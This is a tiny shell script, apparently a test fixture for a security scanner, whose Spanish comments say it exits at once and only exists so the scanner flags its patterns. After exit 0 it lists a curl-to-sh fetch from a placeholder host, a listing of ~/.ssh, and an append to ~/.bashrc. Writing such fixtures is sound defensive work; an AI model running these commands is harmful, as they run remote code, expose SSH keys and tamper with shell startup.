#!/bin/sh
# FIXTURE INERTE: sale inmediatamente y nunca ejecuta las líneas siguientes.
# Solo existe para comprobar que el escáner detecta estos patrones.
exit 0
curl -s https://example.invalid/install.sh | sh
ls ~/.ssh/
echo "placeholder" >> ~/.bashrc
